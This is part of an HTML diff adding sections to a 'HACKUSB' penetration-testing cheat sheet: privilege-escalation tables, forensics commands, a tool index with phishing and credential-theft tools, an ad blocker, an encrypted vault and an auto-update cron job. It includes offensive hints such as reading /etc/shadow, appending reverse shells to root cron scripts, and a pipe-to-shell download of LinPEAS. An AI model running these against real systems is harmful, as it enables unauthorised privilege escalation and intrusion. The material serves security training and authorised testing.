+        <tr><td>Writable cron</td><td>ls -la /etc/cron* && cat /etc/crontab</td><td>Append reverse shell to root script</td></tr>
+        <tr><td>Weak passwd</td><td>cat /etc/passwd && cat /etc/shadow</td><td>Crack with john/hashcat</td></tr>
+        <tr><td>PATH hijack</td><td>echo $PATH && find / -writable -type d 2>/dev/null</td><td>Put malicious binary in writable dir</td></tr>
+        <tr><td>Kernel exploit</td><td>uname -r</td><td>DirtyPipe ≤5.16, DirtyCow ≤4.9</td></tr>
+        <tr><td>Docker escape</td><td>id && cat /proc/1/cgroup</td><td>docker group = instant root</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Windows PrivEsc</div>
+      <table class="ct">
+        <tr><th>Vector</th><th>Check</th><th>Exploit</th></tr>
+        <tr><td>SeImpersonate</td><td>whoami /priv</td><td>PrintSpoofer / GodPotato / JuicyPotato</td></tr>
+        <tr><td>AlwaysInstallElevated</td><td>reg query HKCU\...\Installer /v AlwaysInstallElevated</td><td>msfvenom .msi → msiexec /quiet</td></tr>
+        <tr><td>Unquoted service path</td><td>wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"</td><td>Put exe in gap of path</td></tr>
+        <tr><td>Weak service perms</td><td>accesschk.exe -uwcqv * /accepteula</td><td>Change service binary path</td></tr>
+        <tr><td>AutoLogon creds</td><td>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</td><td>DefaultPassword in registry</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">AUTOMATED TOOLS</div>
+    <table class="ct">
+      <tr><td>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</td><td>LinPEAS (Linux)</td><td>Most comprehensive — colors findings by severity</td></tr>
+      <tr><td>winpeas.exe</td><td>WinPEAS (Windows)</td><td>Checks 100+ vectors automatically</td></tr>
+      <tr><td>python3 04_post-exploit/PEASS-ng/linPEAS/linpeas.py</td><td>LinPEAS from USB</td><td>No curl needed</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 15 FORENSICS ═══════════════════════════════════════ -->
+<div class="sec" id="forensics">
+  <div class="st">FOR<span>ENSICS</span></div>
+  <div class="sd">FILE ANALYSIS · STEGANOGRAPHY · MEMORY FORENSICS · METADATA</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">File Analysis</div>
+      <table class="ct">
+        <tr><td>file suspicious_file</td><td>Identify file type</td><td>Magic bytes, not extension</td></tr>
+        <tr><td>strings -n 8 binary | grep -i pass</td><td>Extract strings</td><td>Find hardcoded passwords/URLs</td></tr>
+        <tr><td>xxd binary | head -20</td><td>Hex dump</td><td>See raw bytes, magic bytes</td></tr>
+        <tr><td>binwalk -e firmware.bin</td><td>Extract embedded</td><td>Find/extract files within files</td></tr>
+        <tr><td>exiftool document.pdf</td><td>Metadata</td><td>Author, GPS, creation date, software</td></tr>
+        <tr><td>foremost -i disk.img -o output/</td><td>File carving</td><td>Recover deleted files from disk images</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Steganography</div>
+      <table class="ct">
+        <tr><td>steghide extract -sf image.jpg</td><td>Extract hidden data</td><td>Tries empty password first</td></tr>
+        <tr><td>steghide info image.jpg</td><td>Check if hidden data</td><td>Shows embedded file info</td></tr>
+        <tr><td>stegseek image.jpg rockyou.txt</td><td>Brute force steg</td><td>Fast steghide password cracker</td></tr>
+        <tr><td>zsteg image.png</td><td>PNG/BMP steg</td><td>LSB analysis, multiple planes</td></tr>
+        <tr><td>identify -verbose image.jpg</td><td>ImageMagick info</td><td>Detailed image metadata</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">Memory Forensics — Volatility3</div>
+    <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">volatility3</div></div>
+      <pre><span class="c"># List running processes:</span>
+python3 07_forensics/volatility3/vol.py -f memory.raw windows.pslist
+
+<span class="c"># Network connections:</span>
+python3 07_forensics/volatility3/vol.py -f memory.raw windows.netstat
+
+<span class="c"># Dump process memory:</span>
+python3 07_forensics/volatility3/vol.py -f memory.raw windows.dumpfiles --pid 1234
+
+<span class="c"># Extract registry hives:</span>
+python3 07_forensics/volatility3/vol.py -f memory.raw windows.registry.hivelist
+
+<span class="c"># Find credentials (mimikatz-style):</span>
+python3 07_forensics/volatility3/vol.py -f memory.raw windows.hashdump</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 17 TOOLS REF ═══════════════════════════════════════ -->
+<div class="sec" id="tools">
+  <div class="st">TOOLS<span class="ng"> REF</span></div>
+  <div class="sd">COMPLETE TOOL INDEX — EVERY TOOL ON THE USB AT A GLANCE</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt cbl">SYSTEM TOOLS</div>
+      <table class="ct">
+        <tr><th>Tool</th><th>Category</th><th>Install</th></tr>
+        <tr><td>nmap</td><td>Port scanner + NSE scripts</td><td>brew / apt / pacman</td></tr>
+        <tr><td>masscan</td><td>Ultra-fast port scanner</td><td>brew / apt</td></tr>
+        <tr><td>netcat (nc/ncat)</td><td>TCP/UDP connections, listeners</td><td>brew / apt</td></tr>
+        <tr><td>sqlmap</td><td>SQL injection automation</td><td>brew / apt / pip</td></tr>
+        <tr><td>nikto</td><td>Web server scanner</td><td>brew / apt</td></tr>
+        <tr><td>gobuster</td><td>Dir/DNS/vhost brute-force</td><td>go install</td></tr>
+        <tr><td>ffuf</td><td>Web fuzzer (fast)</td><td>go install</td></tr>
+        <tr><td>hydra</td><td>Online brute-force (SSH, RDP, HTTP...)</td><td>brew / apt</td></tr>
+        <tr><td>hashcat</td><td>GPU hash cracking</td><td>brew / apt</td></tr>
+        <tr><td>john (jumbo)</td><td>CPU hash cracking + extractors</td><td>brew / apt</td></tr>
+        <tr><td>aircrack-ng</td><td>WiFi WPA2 cracking</td><td>brew / apt</td></tr>
+        <tr><td>binwalk</td><td>Firmware analysis + extraction</td><td>brew / apt / pip</td></tr>
+        <tr><td>exiftool</td><td>Metadata extraction</td><td>brew / apt</td></tr>
+        <tr><td>steghide</td><td>Steganography</td><td>brew / apt</td></tr>
+        <tr><td>metasploit</td><td>Exploitation framework</td><td>brew / apt</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt cbl">GO TOOLS</div>
+      <table class="ct">
+        <tr><th>Tool</th><th>Purpose</th><th>Source</th></tr>
+        <tr><td>subfinder</td><td>Passive subdomain discovery</td><td>ProjectDiscovery</td></tr>
+        <tr><td>httpx</td><td>HTTP probing + tech detection</td><td>ProjectDiscovery</td></tr>
+        <tr><td>nuclei</td><td>Template-based vuln scanner</td><td>ProjectDiscovery</td></tr>
+        <tr><td>naabu</td><td>Fast port scanner (SYN/CONNECT)</td><td>ProjectDiscovery</td></tr>
+        <tr><td>dnsx</td><td>DNS resolver / brute-forcer</td><td>ProjectDiscovery</td></tr>
+        <tr><td>katana</td><td>Web crawler + JS parsing</td><td>ProjectDiscovery</td></tr>
+        <tr><td>interactsh</td><td>OOB interaction server</td><td>ProjectDiscovery</td></tr>
+        <tr><td>waybackurls</td><td>Wayback Machine URL extraction</td><td>TomNomNom</td></tr>
+        <tr><td>assetfinder</td><td>Subdomain finder (crt.sh)</td><td>TomNomNom</td></tr>
+        <tr><td>gf</td><td>Grep patterns for bug bounty</td><td>TomNomNom</td></tr>
+        <tr><td>anew</td><td>Append unique lines only</td><td>TomNomNom</td></tr>
+        <tr><td>gau</td><td>Get All URLs (Wayback + OTX)</td><td>lc</td></tr>
+        <tr><td>amass</td><td>Full OSINT attack surface mapping</td><td>OWASP</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt cbl">PYTHON PIP TOOLS</div>
+      <table class="ct">
+        <tr><th>Package</th><th>Purpose</th><th>Category</th></tr>
+        <tr><td>impacket</td><td>SMB, NTLM, Kerberos attacks</td><td>AD / Post-Exploit</td></tr>
+        <tr><td>certipy-ad</td><td>AD Certificate Services (ESC1-8)</td><td>AD</td></tr>
+        <tr><td>bloodhound</td><td>AD data collection (Python)</td><td>AD</td></tr>
+        <tr><td>pwntools</td><td>Buffer overflow, ROP, CTF</td><td>Exploit Dev</td></tr>
+        <tr><td>scapy</td><td>Packet crafting and capture</td><td>Network</td></tr>
+        <tr><td>shodan</td><td>Shodan CLI + Python API</td><td>OSINT</td></tr>
+        <tr><td>paramiko</td><td>SSH2 in Python</td><td>Network</td></tr>
+        <tr><td>mitmproxy</td><td>MITM proxy, intercept HTTPS</td><td>Web</td></tr>
+        <tr><td>volatility3</td><td>Memory forensics</td><td>Forensics</td></tr>
+        <tr><td>theHarvester</td><td>Email + subdomain OSINT</td><td>Recon</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt cbl">RUBY · RUST · NPM</div>
+      <table class="ct">
+        <tr><th>Tool</th><th>Purpose</th><th>Install</th></tr>
+        <tr><td>wpscan</td><td>WordPress vulnerability scanner</td><td>gem install wpscan</td></tr>
+        <tr><td>evil-winrm</td><td>WinRM PowerShell shell</td><td>gem install evil-winrm</td></tr>
+        <tr><td>feroxbuster</td><td>Fast recursive web fuzzer</td><td>cargo install feroxbuster</td></tr>
+        <tr><td>rustscan</td><td>Fast port scanner → nmap</td><td>cargo install rustscan</td></tr>
+        <tr><td>retire</td><td>Find CVEs in JS libraries</td><td>npm install -g retire</td></tr>
+        <tr><td>wappalyzer-cli</td><td>Detect web technologies</td><td>npm install -g wappalyzer-cli</td></tr>
+        <tr><td>snyk</td><td>Security scanning</td><td>npm install -g snyk</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cbl">CLONED REPOSITORIES (34 TOTAL)</div>
+    <table class="ct">
+      <tr><th>Folder</th><th>Tools</th><th>Profile</th></tr>
+      <tr><td>01_recon/</td><td>theHarvester, sherlock, spiderfoot, recon-ng, osrframework</td><td><span class="tag tg2">MINIMAL</span></td></tr>
+      <tr><td>02_scanning/</td><td>nuclei-templates, nmap-vulners, nmap-scripts-extra</td><td><span class="tag tg2">MINIMAL</span></td></tr>
+      <tr><td>03_exploitation/</td><td>sqlmap, XSStrike, commix, BeEF, evilginx2, PayloadsAllTheThings</td><td><span class="tag ty2">STD</span></td></tr>
+      <tr><td>04_post-exploit/</td><td>PEASS-ng, BloodHound, impacket, NetExec, CrackMapExec, mimikatz</td><td><span class="tag ty2">STD</span></td></tr>
+      <tr><td>05_wireless/</td><td>wifite2, bettercap, hcxtools, airgeddon</td><td><span class="tag ty2">STD</span></td></tr>
+      <tr><td>06_password/</td><td>hashcat-utils, john, cupp</td><td><span class="tag tg2">MINIMAL</span></td></tr>
+      <tr><td>07_forensics/</td><td>volatility3, binwalk, autopsy</td><td><span class="tag ty2">STD</span></td></tr>
+      <tr><td>09_wordlists/</td><td>SecLists, fuzzdb</td><td><span class="tag ty2">STD</span></td></tr>
+      <tr><td>16_phishing/</td><td>gophish, evilginx3</td><td><span class="tag tr">FULL</span></td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cbl">CUSTOM SCRIPTS (08_scripts/)</div>
+    <table class="ct">
+      <tr><th>Script</th><th>Usage</th><th>What it does</th></tr>
+      <tr><td>auto_recon.zsh</td><td>zsh auto_recon.zsh &lt;TARGET&gt; [--full]</td><td>nmap + subfinder + gobuster + nikto + nuclei</td></tr>
+      <tr><td>subdomain_enum.zsh</td><td>zsh subdomain_enum.zsh &lt;DOMAIN&gt;</td><td>subfinder + assetfinder + amass + httpx</td></tr>
+      <tr><td>livehosts.py</td><td>python3 livehosts.py &lt;CIDR&gt;</td><td>Ping sweep, 150 threads</td></tr>
+      <tr><td>port_scan.py</td><td>python3 port_scan.py &lt;HOST&gt; [range]</td><td>Pure Python port scanner</td></tr>
+      <tr><td>hashcrack.py</td><td>python3 hashcrack.py &lt;HASH&gt;</td><td>Auto-detect + rockyou.txt</td></tr>
+      <tr><td>revshell_gen.py</td><td>python3 revshell_gen.py &lt;IP&gt; &lt;PORT&gt;</td><td>12 reverse shell variants</td></tr>
+      <tr><td>install_on_pc.zsh</td><td>zsh install_on_pc.zsh</td><td>Install all tools on any PC</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 18 AD BLOCKER ══════════════════════════════════════ -->
+<div class="sec" id="adblocker">
+  <div class="st">AD<span> BLOCK</span></div>
+  <div class="sd">HAGEZI DNS BLOCKLISTS — ADS · TRACKING · MALWARE · PHISHING</div>
+  <div class="ac">Enable via: <strong>sudo zsh 13_adblocker/setup_adblocker.zsh</strong> — works on macOS, Linux, and Windows WSL2</div>
+
+  <div class="ex"><strong>How it works:</strong> Adds ~100K+ domains to <code>/etc/hosts</code> pointing to <code>0.0.0.0</code>. Every DNS lookup for a blocked domain returns nothing — no request reaches the ad/tracker/malware server. Works system-wide, offline, in any browser or app. <span class="how">Source:</span> Hagezi DNS Blocklists — most accurate maintained blocklists available.</div>
+
+  <div class="cb">
+    <div class="cbt cc">SETUP &amp; USAGE</div>
+    <div class="os-block os-mac">
+      <div class="term">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">macOS</div></div>
+        <pre><span class="c"># Enable ad-blocker:</span>
+sudo zsh /Volumes/HACKUSB/13_adblocker/setup_adblocker.zsh
+
+<span class="c"># Choose profile (1-4), then it patches /etc/hosts + flushes DNS cache:</span>
+dscacheutil -flushcache && killall -HUP mDNSResponder
+
+<span class="c"># Check status:</span>
+sudo zsh /Volumes/HACKUSB/13_adblocker/setup_adblocker.zsh --status
+
+<span class="c"># Disable:</span>
+sudo zsh /Volumes/HACKUSB/13_adblocker/setup_adblocker.zsh --restore</pre>
+      </div>
+    </div>
+    <div class="os-block os-linux">
+      <div class="term tg">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Linux</div></div>
+        <pre><span class="c"># Enable:</span>
+sudo zsh /media/$USER/HACKUSB/13_adblocker/setup_adblocker.zsh
+
+<span class="c"># DNS flush (auto-done by script, manual if needed):</span>
+resolvectl flush-caches         <span class="c"># systemd-resolved</span>
+nscd -i hosts                   <span class="c"># nscd</span>
+
+<span class="c"># Status / restore:</span>
+sudo zsh .../setup_adblocker.zsh --status
+sudo zsh .../setup_adblocker.zsh --restore</pre>
+      </div>
+    </div>
+    <div class="os-block os-win">
+      <div class="term tb">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Windows WSL2</div></div>
+        <pre><span class="c"># In WSL2 — patches /etc/hosts inside WSL:</span>
+sudo zsh /mnt/e/HACKUSB/13_adblocker/setup_adblocker.zsh
+
+<span class="c"># For Windows hosts file (C:\Windows\System32\drivers\etc\hosts)</span>
+<span class="c"># Run PowerShell as Admin and append the list manually.</span>
+
+<span class="c"># Or use Windows native DNS blocking: Pi-hole on WSL2</span>
+<span class="c"># Or browser extensions: uBlock Origin (recommended)</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cc">BLOCKLIST PROFILES</div>
+    <table class="ct">
+      <tr><th>Profile</th><th>Domains</th><th>When to use</th></tr>
+      <tr><td><span class="tag tg2">Light</span> hosts_hagezi_light.txt</td><td>~50K</td><td>Minimal — very few false positives, good for beginners</td></tr>
+      <tr><td><span class="tag ty2">Pro ★</span> hosts_hagezi_pro.txt</td><td>~100K</td><td><strong>Recommended</strong> — best balance of blocking vs compatibility</td></tr>
+      <tr><td><span class="tag tr">Ultimate</span> hosts_hagezi_ultimate.txt</td><td>~250K</td><td>Aggressive — may hit some legitimate sites</td></tr>
+      <tr><td><span class="tag tp2">Combo</span> hosts_combined.txt</td><td>~130K</td><td>Pro + Malware — blocks ads AND malware/phishing</td></tr>
+    </table>
+  </div>
+
+  <div class="cb">
+    <div class="cbt cc">UPDATE BLOCKLISTS</div>
+    <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">update lists</div></div>
+      <pre><span class="c"># Update all blocklists + git repos:</span>
+sudo zsh hackusb_update.zsh
+
+<span class="c"># Manual download (if auto-update fails):</span>
+<span class="c"># Pro list:</span>
+curl -L -o 13_adblocker/hosts_lists/hosts_hagezi_pro.txt \
+  "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/pro.txt"
+
+<span class="c"># Malware list:</span>
+curl -L -o 13_adblocker/hosts_lists/hosts_malware.txt \
+  "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/threat-intelligence-feeds.txt"
+
+<span class="c"># Light list:</span>
+curl -L -o 13_adblocker/hosts_lists/hosts_hagezi_light.txt \
+  "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/light.txt"
+
+<span class="c"># Ultimate list:</span>
+curl -L -o 13_adblocker/hosts_lists/hosts_hagezi_ultimate.txt \
+  "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/ultimate.txt"
+
+<span class="c"># Verify (should show >100 lines):</span>
+grep -c "^0.0.0.0" 13_adblocker/hosts_lists/hosts_hagezi_pro.txt</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 17 VAULT ════════════════════════════════════════════ -->
+<div class="sec" id="vault">
+  <div class="st">EN<span class="np">CRYPT</span></div>
+  <div class="sd">VERACRYPT AES-256 VAULT — SSH KEYS · CREDENTIALS · REPORTS</div>
+
+  <div class="ex ep"><strong>What the vault is:</strong> A single encrypted file (secrets.vc) on the stick — like a USB within a USB. Mount = normal folder. Unmount = secure encrypted file. AES-256-XTS + SHA-512 key derivation. Without the password: unbreakable for thousands of years.</div>
+
+  <div class="cb">
+    <div class="cbt cp">vault.zsh — All Commands</div>
+    <div class="term tp"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">vault.zsh</div></div>
+      <pre><span class="c"># Open vault (enter password)</span>
+zsh /Volumes/HACKUSB/14_vault/vault.zsh mount
+<span class="c"># macOS → /Volumes/VAULT</span>
+<span class="c"># Linux  → /mnt/hackusb_vault</span>
+
+<span class="c"># Check status</span>
+zsh /Volumes/HACKUSB/14_vault/vault.zsh status
+
+<span class="c"># Close securely (ALWAYS before removing stick!)</span>
+zsh /Volumes/HACKUSB/14_vault/vault.zsh unmount
+
+<span class="c"># Create backup</span>
+zsh /Volumes/HACKUSB/14_vault/vault.zsh backup
+<span class="c"># → secrets.vc.bak.DATE in 14_vault/</span>
+
+<span class="c"># Change password</span>
+veracrypt --change-password /Volumes/HACKUSB/secrets.vc
+
+<span class="c"># What to put in the vault:</span>
+<span class="c"># ssh_keys/     private SSH keys (id_rsa, id_ed25519)</span>
+<span class="c"># credentials/  VPN configs, API keys, password exports</span>
+<span class="c"># reports/      confidential pentest reports and findings</span>
+<span class="c"># notes.txt     IPs, access details, credentials (encrypted!)</span></pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 18 AUTO-UPDATE ═════════════════════════════════════ -->
+<div class="sec" id="autoupdate">
+  <div class="st">AUTO<span class="np"> UPDATE</span></div>
+  <div class="sd">HACKUSB_UPDATE.ZSH — GIT PULL + BLOCKLISTS + WORDLISTS IN ONE COMMAND</div>
+
+  <div class="ex ep"><strong>What hackusb_update.zsh does:</strong> Searches all subdirectories for .git folders and runs <code>git pull --ff-only</code>. Shows new commits per repo. Then: re-download rockyou.txt and all blocklists. Lists are checked for &gt;1000 entries — if download fails the old version is kept. Log in .last_update.</div>
+
+  <div class="cb">
+    <div class="cbt cp">hackusb_update.zsh</div>
+    <div class="term tp"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">hackusb_update.zsh</div></div>
+      <pre><span class="c"># Standard update (only changed repos/files):</span>
+sudo zsh /Volumes/HACKUSB/hackusb_update.zsh
+
+<span class="c"># Force update (re-download everything):</span>
+sudo zsh /Volumes/HACKUSB/hackusb_update.zsh --force
+
+<span class="c"># What gets updated:</span>
+<span class="c"># ✓ All git repos (theHarvester, sherlock, sqlmap, nuclei-templates...)</span>
+<span class="c"># ✓ rockyou.txt (if missing or --force)</span>
+<span class="c"># ✓ hosts_hagezi_pro.txt, hosts_hagezi_light.txt, hosts_malware.txt</span>
+<span class="c"># ✓ hosts_combined.txt (Pro + Malware recombined)</span>
+
+<span class="c"># Show last update date:</span>
+cat /Volumes/HACKUSB/.last_update
+<span class="c"># → 2025-05-01 03:00:12 Updated:14 Skipped:2 Failed:0</span>
+
+<span class="c"># Set up monthly cronjob (offered by setup wizard):</span>
+(crontab -l 2>/dev/null; echo "0 3 1 * * sudo zsh /Volumes/HACKUSB/hackusb_update.zsh --force") | crontab -
+crontab -l | grep hackusb    <span class="c"># Verify</span>
+crontab -l | grep -v hackusb | crontab -  <span class="c"># Remove</span></pre>
+    </div>
+  </div>
+
+  <div class="igrid">
+    <div class="ibox">
+      <div class="ibox-t" style="color:var(--pu)">MERGE CONFLICTS</div>
+      <p>If <code>git pull --ff-only</code> fails (local changes) → auto <code>git reset --hard origin/main</code>. Custom files in tool folders could be overwritten. Always put your own scripts in <code>08_scripts/</code> or in the Vault.</p>
+    </div>
+    <div class="ibox">
+      <div class="ibox-t" style="color:var(--gr)">BLOCKLIST QUALITY</div>
+      <p>Each downloaded blocklist is checked for &gt;1000 entries. If download fails (no internet, server down) → file is discarded, old version is kept. No data loss.</p>
+    </div>
+    <div class="ibox">
+      <div class="ibox-t" style="color:var(--ye)">INTERNET REQUIRED</div>
+      <p>Checks connection to github.com first. Without internet: clean abort. <strong>Offline:</strong> manually <code>cd 01_recon/theHarvester && git pull</code> in each tool directory.</p>
+    </div>
+    <div class="ibox">
+      <div class="ibox-t" style="color:var(--cy)">CRONJOB</div>
+      <p>Monthly cronjob (1st of every month, 03:00) offered in setup wizard. Log goes to <code>update.log</code> and <code>.last_update</code> on stick. View: <code>crontab -l | grep hackusb</code>.</p>
+    </div>
+  </div>
+</div>
+
+</main>
+</div>
+
+<script>
+var currentOS = 'mac';
+var osLabels = {
+  mac: '🍎 macOS',
+  linux: '🐧 Linux',
+  win: '🪟 Windows'
+};
+var osIndicators = {
+  mac: 'SYSTEM: MACOS',
+  linux: 'SYSTEM: LINUX',
+  win: 'SYSTEM: WINDOWS'
+};
+
+function setOS(os) {
+  currentOS = os;
+  document.body.className = 'os-' + os;
+  document.getElementById('sidebar-os-label').textContent = osLabels[os];
+  document.getElementById('os-indicator').textContent = osIndicators[os];
+  ['mac','linux','win'].forEach(function(o) {
+    var btn = document.getElementById('btn-' + o);
+    btn.className = 'os-btn' + (o === os ? ' active-' + o : '');
+  });
+  // save preference
+  try { localStorage.setItem('hackusb_os', os); } catch(e) {}
+}
+
+function show(id, btn) {
+  document.querySelectorAll('.sec').forEach(function(s){ s.classList.remove('a'); });
+  document.querySelectorAll('.ni').forEach(function(b){ b.classList.remove('a'); });
+  document.getElementById(id).classList.add('a');
+  btn.classList.add('a');
+  document.querySelector('.content').scrollTop = 0;
+}
+
+// Load saved OS preference
+(function(){
+  try {
+    var saved = localStorage.getItem('hackusb_os');
+    if (saved && ['mac','linux','win'].includes(saved)) setOS(saved);
+    else setOS('mac');
+  } catch(e) { setOS('mac'); }
+})();
+</script>
+</body>
+</html>
